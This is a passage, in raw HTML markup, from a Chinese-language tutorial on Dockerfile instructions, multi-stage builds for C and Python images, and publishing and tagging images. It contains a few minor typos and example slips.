class="hljs-name">user</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">src</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">dest</span>&gt;</span>]<br>COPY [--chown=<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>] [&quot;<span class="hljs-tag">&lt;<span class="hljs-name">src</span>&gt;</span>&quot;,... &quot;<span class="hljs-tag">&lt;<span class="hljs-name">dest</span>&gt;</span>&quot;]<br></code></pre></td></tr></table></figure><p><code>CPOY</code>指令将从构建上下文目录中<code>&lt;src&gt;</code>复制到新一层的镜像内的<code>&lt;dest&gt;</code>的目录内。<code>&lt;src&gt;</code>可以是多个，但是必须为上下文目录下的内容，支持通配符，通配符规则要满足 Go 的 <a href="https://golang.org/pkg/path/filepath/#Match"><code>filepath.Match</code></a> 规则；<code>&lt;dest&gt;</code>可以是容器内的绝对路径，也可以是工作目录（WORKDIR指定的目录）的相对路径，目标路径目录不存在会自行创建缺失目录。关于<strong>权限</strong>问题，<code>COPY</code>指令会保留源文件的权限设置，如需要手动设置则需指定<code>[--chown=&lt;user&gt;:&lt;group&gt;]</code>。如：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> package.json /tmp</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> package* /tmp</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=55:mygroup package.json /tmp</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=bin package.json /tmp</span><br></code></pre></td></tr></table></figure><p>​在使用<code>COPY</code>指令时，UID和GUI默认为0，等同于<code>COPY --chown=0:0 &lt;src&gt; &lt;dest&gt;</code>，我们可以利用<code>--chown</code>指定文件的用户ID和组ID，也可以直接指定用户名和组名，当然如果容器内根本不存在用户和组信息时，<code>--chown</code>指定的<code>COPY</code>指令会导致运行失败。</p><p><strong>注：</strong></p><ul><li>如果源路径为文件夹，复制的时候不是直接复制该文件夹，而是将文件夹中的内容复制到目标路径。</li><li>–chown只适用于构建Liunx类型的容器，由于Windows容器权限概念的不同，–chown无法正常使用。</li><li><code>&lt;src&gt;</code>以相对路径指定文件，文件必须在当前上下文之内，不能使用COPY <code>../path/path</code></li></ul><p><strong>COPY增强语意  –link</strong></p><p><code>COPY --link</code>会将复制的文件放在一个空目录中，并将此目录转换为一个独立的层，并链接到上一阶段的构建中。比如：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> httpd<br><span class="hljs-keyword">COPY</span><span class="language-bash"> --<span class="hljs-built_in">link</span> index.html &gt; /usr/local/apache2/htdocs/index.html</span><br></code></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">FROM</span> httpd<br><br><span class="hljs-keyword">FROM</span> scratch<br><span class="hljs-keyword">COPY</span> <span class="hljs-keyword">index</span>.html &gt; /usr/<span class="hljs-keyword">local</span>/apache2/htdocs/<span class="hljs-keyword">index</span>.html<br></code></pre></td></tr></table></figure><p>当不使用<code>--link</code>时，Docker每一层构建都需要包含上一层的文件，也就是说当前层的构建需要上层完全文件系统。而使用<code>--link</code>时，情况就发生了变化，因为<code>--link</code>是创建的独立的一层，在这层中仅包含复制的文件，并未包含上一层的文件系统，只有在最终容器启动时，Docker引擎才会下载上层文件系统并合并复制的层。</p><p><strong>参考链接：</strong><a href="https://www.howtogeek.com/devops/how-to-accelerate-docker-builds-and-optimize-caching-with-copy-link/">How to Accelerate Docker Builds and Optimize Caching With “COPY –link”</a></p><h4 id="ADD-高级文件复制指令"><a href="#ADD-高级文件复制指令" class="headerlink" title="ADD 高级文件复制指令"></a>ADD 高级文件复制指令</h4><p><code>ADD</code>与<code>COPY</code>极其相似，可以理解为<code>COPY</code>命令的升级版，<code>ADD</code>有一个非常常用的功能：如果<code>&lt;src&gt;</code>为一个<code>tar</code>压缩文件的话，压缩格式为 <code>gzip</code>, <code>bzip2</code> 以及 <code>xz</code> 的情况下，<code>ADD</code> 指令将会自动解压缩这个压缩文件到 <code>&lt;dest&gt;</code> 去。在某些情况下这个功能非常有用。</p><p>但是<code>ADD</code>指令会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。因此在 <code>COPY</code> 和 <code>ADD</code> 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code>。</p><h4 id="CMD-容器启动指令"><a href="#CMD-容器启动指令" class="headerlink" title="CMD 容器启动指令"></a>CMD 容器启动指令</h4><p><code>CMD</code>指令的格式和<code>RUN</code>指令类似，也是两种格式：</p><ul><li><code>shell</code>格式：<code>CMD &lt;命令&gt;</code></li><li><code>exec</code>格式：<code>CMD [&quot;可执行文件&quot;,&quot;参数1&quot;，&quot;参数2&quot;...]</code></li><li>参数列表格式：<code>CMD [&quot;参数1&quot;, &quot;参数2&quot;...]</code>。在指定了 <code>ENTRYPOINT</code> 指令后，用 <code>CMD</code> 指定具体的参数。</li></ul><p>简单而言，<code>CMD</code>就是指定容器主程序启动执行的默认命令，实际命令会当作<code>sh -c</code>的参数执行。比如：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> 123</span><br></code></pre></td></tr></table></figure><p>在实际执行时，会变为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">CMD <span class="hljs-selector-attr">[<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;echo 123&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>在这里我们可以看出，容器实际运行主程序为<code>sh</code>，而容器是一个进程的概念，这与虚拟机不太一样的，虚拟机可以理解为一个操作系统进程的概念，如果操作系统进程停止了，那么虚拟机也停止了；而容器本身就是一个<code>sh</code>进程，我们使用<code>CMD</code>指定<code>sh</code>的参数，因此我们不能让<code>sh</code>进程退出，这就要求我们指定的参数必须一直位于前台运行。比如：</p><p>我们正常启动<code>ngimx</code>命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service nginx <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure><p>但我们不能在<code>CMD</code>命令中这样用，因为该命令执行完后，进程就会退出，<code>nginx</code>后台运行，而在容器中这就意味着<code>CMD</code>指令退出了，容器也就停止了，根本就不存在<code>nginx</code>后台运行，正确的做法是将<code>nginx</code>作为前台运行，且终端不退出。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">CMD <span class="hljs-selector-attr">[<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><blockquote><p>  此外，也可以设置CMD [“sleep”,”infinity”]让当前shell永久处于睡眠模式，目的是让容器不要退出。</p></blockquote><p><strong>注意：如果容器中存在多个<code>CMD</code>指令，只有最后一个 <code>CMD</code> 指令会生效，即它会成为容器启动时执行的默认命令。每个 Dockerfile 只允许有一个 <code>CMD</code> 指令，后面 <code>CMD</code> 指令会覆盖前面 <code>CMD</code> 指令，</strong></p><h4 id="ENTRYPOINT-入口点"><a href="#ENTRYPOINT-入口点" class="headerlink" title="ENTRYPOINT 入口点"></a>ENTRYPOINT 入口点</h4><p><code>ENTRYPOINT</code> 的格式和 <code>RUN</code> 指令格式一样，分为 <code>exec</code> 格式和 <code>shell</code> 格式。</p><p><code>ENTRYPOINT</code> 的目的和 <code>CMD</code> 一样，都是在指定容器启动程序及参数。<code>ENTRYPOINT</code> 在运行时也可以替代，不过比 <code>CMD</code> 要略显繁琐，需要通过 <code>docker run</code> 的参数 <code>--entrypoint</code> 来指定。</p><p>当指定了 <code>ENTRYPOINT</code> 后，<code>CMD</code> 的含义就发生了改变，不再是直接的运行其命令，而是将 <code>CMD</code> 的内容作为参数传给 <code>ENTRYPOINT</code> 指令，换句话说实际执行时，将变为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ENTRYPOINT</span>&gt;</span> &quot;<span class="hljs-tag">&lt;<span class="hljs-name">CMD</span>&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>因此，<code>ENTRYPOINT</code>和<code>CMD</code>经常配合使用，例如，需要在镜像里面通过<code>java -jar</code>的方式启动一个java工程，就可以采用下面的方式，默认启动的时候 <strong>commcon.jar</strong> 这个工程：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">ENTRYPOINT <span class="hljs-selector-attr">[<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>]</span><br> <br>CMD <span class="hljs-selector-attr">[<span class="hljs-string">&quot;common.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>如果我们不想启动这个 <strong>common.jar</strong> 的工程了，我们在启动容器的时候更换下命令就可以了，如下所示：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> 容器名称 xxxx.jar<br></code></pre></td></tr></table></figure><h4 id="ENV-设置环境变量"><a href="#ENV-设置环境变量" class="headerlink" title="ENV 设置环境变量"></a>ENV 设置环境变量</h4><p>格式有两种：</p><ul><li><code>ENV  &lt;key&gt; &lt;value&gt;</code></li><li><code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li></ul><p>这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 <code>RUN</code>，还是运行时的应用，都可以直接使用这里定义的环境变量。</p><h4 id="ARG-构建参数"><a href="#ARG-构建参数" class="headerlink" title="ARG 构建参数"></a>ARG 构建参数</h4><p>构建参数和<code>ENV</code>效果一样，都是设置环境变量。所不同的是，<code>ARG</code> 所设置的构建环境的环境变量（可以理解为<code>Dockerfile</code>的环境变量，只在<code>Dockerfile</code>里使用），在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 <code>ARG</code> 保存密码之类的信息，因为 <code>docker history</code> 还是可以看到所有值的。</p><p>ARG 指令有生效范围，如果在 <code>FROM</code> 指令之前指定，那么只能用于 <code>FROM</code> 指令中。要想在其他指令中使用该变量，你必须在 <code>FROM</code> 之后再次指定 <code>ARG</code>。对于多阶段构建，也是一样，Dockerfile 多个 <code>FROM</code> 指令都可以使用 <code>$&#123;DOCKER_USERNAME&#125;</code>，对于在各个阶段中使用的变量都必须在每个阶段分别指定：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ARG <span class="hljs-attribute">DOCKER_USERNAME</span>=library<br><br><span class="hljs-keyword">FROM</span> <span class="hljs-variable">$&#123;DOCKER_USERNAME&#125;</span>/alpine<br><br><span class="hljs-comment"># 在FROM 之后使用变量，必须在每个阶段分别指定</span><br>ARG <span class="hljs-attribute">DOCKER_USERNAME</span>=library<br><br><span class="hljs-built_in">RUN</span> <span class="hljs-built_in">set</span> -x ; echo <span class="hljs-variable">$&#123;DOCKER_USERNAME&#125;</span><br><br><span class="hljs-keyword">FROM</span> <span class="hljs-variable">$&#123;DOCKER_USERNAME&#125;</span>/alpine<br><br><span class="hljs-comment"># 在FROM 之后使用变量，必须在每个阶段分别指定</span><br>ARG <span class="hljs-attribute">DOCKER_USERNAME</span>=library<br><br><span class="hljs-built_in">RUN</span> <span class="hljs-built_in">set</span> -x ; echo <span class="hljs-variable">$&#123;DOCKER_USERNAME&#125;</span><br></code></pre></td></tr></table></figure><h4 id="VOLUME-定义匿名卷"><a href="#VOLUME-定义匿名卷" class="headerlink" title="VOLUME 定义匿名卷"></a>VOLUME 定义匿名卷</h4><p>格式为：</p><ul><li><p><code>VOLUME [&quot;&lt;路径1&gt;&quot;，&quot;&lt;路径2&gt;&quot;]</code></p></li><li><p><code>VOLUME &lt;路径&gt;</code></p></li></ul><p>我知道通过Docker可以将我们的软件运行环境和基于运行环境开发的软件打包成镜像，而镜像运行伴随着容器，内部数据文件的生命周期也同容器的生命周期。如果容器运行过程中有些数据我们需要保存该怎么办呢？因此于是容器卷技术便孕育而生，简单理解容器卷就是一个外置硬盘。<code>VOLUME &lt;路径&gt;</code>指定容器内的<code>&lt;路径&gt;</code>目录为匿名卷，该目录下所有修改都将被保存，不会随着容器的删除而消失，并且可以再次指定其他容器挂载。</p><p><strong>使用命令添加挂载卷</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 命令挂载卷</span><br>docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -v mydata:/data nginx</span><br></code></pre></td></tr></table></figure><p>在这条命令中就使用<code>-v</code>指定 <code>mydata</code> 这个命名卷挂载到了 <code>/data</code> 这个位置，替代了 <code>Dockerfile</code> 中定义的匿名卷的挂载配置。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 匿名挂载卷</span><br>docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -v /etc/nginx nginx</span><br></code></pre></td></tr></table></figure><p>这条命令中<code>-v</code>没有指定挂载卷名字，是一个匿名挂载卷，挂载到<code>/etc/nginx</code>。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 挂载本地目录</span><br>docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -v /home/nginx:/etc/nginx nginx</span><br></code></pre></td></tr></table></figure><p>这条指令将本地目录挂载到<code>/etc/nginx</code>目录下，<code>/etc/nginx</code>目录所有修改都将同步到本地。</p><h4 id="EXPOSE暴露端口"><a href="#EXPOSE暴露端口" class="headerlink" title="EXPOSE暴露端口"></a>EXPOSE暴露端口</h4><p>格式为：</p><ul><li><code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></li></ul><p><code>EXPOSE</code> 指令是声明容器运行时提供服务的端口，这只是一个声明，在容器运行时并不会因为这个声明应用就会开启这个端口的服务。在 <code>Dockerfile </code>中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 <code>docker run -P</code> 时，会自动随机映射 <code>EXPOSE</code> 的端口。</p><h4 id="WORKDIR-指定工作目录"><a href="#WORKDIR-指定工作目录" class="headerlink" title="WORKDIR 指定工作目录"></a>WORKDIR 指定工作目录</h4><p><code>WORKDIR</code>用于设定容器构建和工作时的目录（当前目录），由于容器是一种分层结构，每层结构都是一个子容器，而<code>WORKDIR</code>则可以设置子容器的工作目录，如该目录不存在，<code>WORKDIR</code> 会帮你建立目录。</p><p><code>WORKDIR</code>支持绝对路径和相对路径，在相对路径设置时，<code>WORKDIR</code>的设置当前工作目录有关，新设置得<code>WORKDIR</code>都是基于原有的<code>WORKDIR</code>设置的，默认的<code>WORKDIR</code>为根目录比如：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">WORKDIR /a<br><span class="hljs-meta prompt_">...</span><br>WORKDIR b<br><span class="hljs-meta prompt_">...</span><br>WORKDIR a<br><span class="hljs-meta prompt_">...</span><br></code></pre></td></tr></table></figure><p>最后的工作目录为<code>/a/b/c</code>。</p><h4 id="USER-指定当前用户"><a href="#USER-指定当前用户" class="headerlink" title="USER 指定当前用户"></a>USER 指定当前用户</h4><p><code>USER</code>用于指定<code>RUN</code>，<code>CMD</code>，<code>ENTRYPOINT</code>这类命令的运行身份，<code>USER</code>与<code>WORKDIR</code>一样，都会改变运行状态并影响以后的层。当然，运行<code>USER</code>之前，必须先创建相应的用户。</p><p>如果以 <code>root</code> 执行的脚本，在执行期间希望改变身份，一般不会使用使用 <code>su</code> 或者 <code>sudo</code>，建议使用 <a href="https://github.com/tianon/gosu"><code>gosu</code></a>。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 建立 redis 用户，并使用 gosu 换另一个用户执行命令</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br><span class="hljs-comment"># 下载 gosu</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -O /usr/local/bin/gosu <span class="hljs-string">&quot;https://github.com/tianon/gosu/releases/download/1.12/gosu-amd64&quot;</span> \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">chmod</span> +x /usr/local/bin/gosu \</span><br><span class="language-bash">    &amp;&amp; gosu nobody <span class="hljs-literal">true</span></span><br><span class="hljs-comment"># 设置 CMD，并以另外的用户执行</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [ <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;gosu&quot;</span>, <span class="hljs-string">&quot;redis&quot;</span>, <span class="hljs-string">&quot;redis-server&quot;</span> ]</span><br></code></pre></td></tr></table></figure><h4 id="SHELL指令"><a href="#SHELL指令" class="headerlink" title="SHELL指令"></a>SHELL指令</h4><p>格式：</p><ul><li><code>SHELL [&quot;executable&quot;, &quot;parameters&quot;]</code></li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">SHELL</span> 指令可以指定 <span class="hljs-keyword">RUN</span> ENTRYPOINT CMD 指令的 <span class="hljs-keyword">shell</span>，Linux 中默认为 [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>]<br></code></pre></td></tr></table></figure><h3 id="Dockerfile多阶段构建"><a href="#Dockerfile多阶段构建" class="headerlink" title="Dockerfile多阶段构建"></a><code>Dockerfile</code>多阶段构建</h3><p>某些情况下，我们希望Docker将我们的源代码编译安装，但是并不希望保留编译相关的组件，只需要最后的可执行程序，为了实现这种功能，<code>Dcokerfile</code>提供了多阶段构建的功能，<code>Dockerfile</code>多阶段构建，可以构建Docker多个阶段，但只保留最后的阶段，这样在构建过程中生成的不必要的组件不会存在最后的阶段。</p><p><strong>构建时从其他镜像或阶段复制文件</strong></p><p>只需要使用<code>COPY --from=阶段序号/阶段名称/镜像 &lt;源路径&gt; &lt;目标路劲&gt;</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">COPY</span> --<span class="hljs-keyword">from</span>=<span class="hljs-number">0</span> <span class="hljs-regexp">/etc/</span>demo .<br><span class="hljs-keyword">COPY</span> --<span class="hljs-keyword">from</span>=nginx:latest <span class="hljs-regexp">/etc/</span>demo .<br></code></pre></td></tr></table></figure><p><code>Dockerfile</code>多阶段构建示例：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> gcc:<span class="hljs-number">4.9</span> as frontend<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#include&lt;stdio.h&gt;\nint main()&#123;printf(&quot;Hello,World!!&quot;);return 0;&#125;&#x27;</span> &gt; main.c \</span><br><span class="language-bash">    &amp;&amp; gcc main.c -o main</span><br><br><span class="hljs-keyword">FROM</span> ubuntu<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=frontend /app/main .</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="hljs-string">&quot;/bin/bash&quot;</span> ]</span><br></code></pre></td></tr></table></figure><p>上面<code>Dockerfile</code>的意思就是，在<code>gcc</code>生成<code>main.c</code>文件并编译为可执行文件<code>main</code>，而基于<code>ubuntu</code>镜像，创建一个新的仅包含可执行程序<code>main</code>的镜像，这样的大大减少了镜像的大小。</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">docker build -t helloword .<br></code></pre></td></tr></table></figure><p>我们查看<code>helloword</code>镜像大小，基本与<code>ubuntu</code>镜像相同。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9610b5c49e0746a8ac8fb52b7906209a.png" alt="image-20221223212953552"></p><p>我们直接运行<code>helloworld</code>容器，可以看到可执行程序能正常运行。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> <span class="hljs-comment">--rm helloword</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1af7a37cb11b4e6a8b06b8df55ff705e.png" alt="image-20221223212448321"></p><p>当然我们也可以单独构建某一阶段镜像</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker build <span class="hljs-comment">--target frontend -t mygcc .</span><br></code></pre></td></tr></table></figure><p><strong>Python多阶段构建Python环境</strong></p><p>如下为Dockerfile代码。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">3.8</span>-buster as builder-image<br><br><span class="hljs-comment">### install requirements</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> requirements.txt .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install --no-cache-dir -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><br><br><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">3.8</span>-slim-buster<br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=builder-image /usr/local/bin /usr/local/bin</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=builder-image /usr/local/lib/python3.8/site-packages /usr/local/lib/python3.8/site-packages</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/code</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;python3&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>首先，使用<code>python:3.8-buster</code>作为下载python组件的镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FROM</span> python:<span class="hljs-number">3</span>.<span class="hljs-number">8</span>-buster as builder-image<br></code></pre></td></tr></table></figure><p>因为是第一阶段，需要安装很多包，所以要选择一个较为完整的python环境。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">slim</span>:通常只安装运行特定工具所需的最小包<br><span class="hljs-attribute">Alphine</span>: 专门为容器构建的操作系统，比其他的操作系统更小，但是其上会缺少很多软件包并且使用的 glibc 等都是阉割版<br><span class="hljs-attribute">buster</span>: 表示使用debian <span class="hljs-number">10</span>的系统，与之对应的是stretch， debian <span class="hljs-number">9</span>的系统， jessie， debian <span class="hljs-number">8</span> 的系统<br></code></pre></td></tr></table></figure><p>其次，安装python模块</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">COPY</span> requirements.txt .<br><span class="hljs-keyword">RUN</span> pip3 install --<span class="hljs-keyword">no</span>-cache-<span class="hljs-keyword">dir</span> -r requirements.txt -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure><p>pip安装python包，<code>--no-cache-dir</code>的作用是不缓存下载的包，-i 指定国内的镜像源。</p><p>然后，选择3.8-slim-buster版本，因为用不到python中所有的功能，可以选择一个稍微小一点的基础镜像。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FROM</span> python:<span class="hljs-number">3</span>.<span class="hljs-number">8</span>-slim-buster<br></code></pre></td></tr></table></figure><p>最后，把第一阶段的python安装的包都copy过来，此时镜像就包含了python以及需要安装的python模块。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">COPY</span> --<span class="hljs-keyword">from</span>=builder-image <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin /u</span>sr<span class="hljs-regexp">/local/</span>bin<br><span class="hljs-keyword">COPY</span> --<span class="hljs-keyword">from</span>=builder-image <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">8</span><span class="hljs-regexp">/site-packages /u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/python3.8/</span>site-packages<br></code></pre></td></tr></table></figure><p>剩下的就是启动程序的操作，这个就因人而异了。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/code</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;python3&quot;</span>]</span><br></code></pre></td></tr></table></figure><h3 id="Dockerfile发布镜像"><a href="#Dockerfile发布镜像" class="headerlink" title="Dockerfile发布镜像"></a><code>Dockerfile</code>发布镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t geniotic/tor_zeronet_nodes:latest .<br>docker push geniotic/tor_zeronet_nodes:latest<br></code></pre></td></tr></table></figure><p><strong>指定镜像多个标签</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker <span class="hljs-keyword">tag</span> <span class="hljs-title">geniotic</span>/tor_zeronet_nodes:latest geniotic/tor_zeronet_nodes:v1<br></code></pre></td></tr></table></figure><h3 id="Docker离线镜像"><a href="#Docker离线镜像" class="headerlink" title="Docker离线镜像"></a>Docker离线镜像</h3><p>打包镜像为离线包</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">docker <span 